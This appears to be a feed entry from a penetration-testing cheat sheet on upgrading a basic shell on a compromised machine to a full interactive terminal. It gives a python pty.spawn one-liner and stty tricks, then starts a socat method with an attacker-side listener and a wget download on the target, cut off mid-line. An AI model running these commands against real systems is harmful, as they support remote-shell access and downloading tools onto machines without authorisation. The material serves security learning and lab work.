item.title: Upgrade Shell
item.description: Upgrade Shell Check installed binary which sh which bash which python3 which python python python3 -c 'import pty; pty.spawn("/bin/bash")' # Ctrl-Z to send the process to background, then stty raw -echo; fg # After fg, press enter again, then export TERM=xterm-256color socat Download socat # Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.
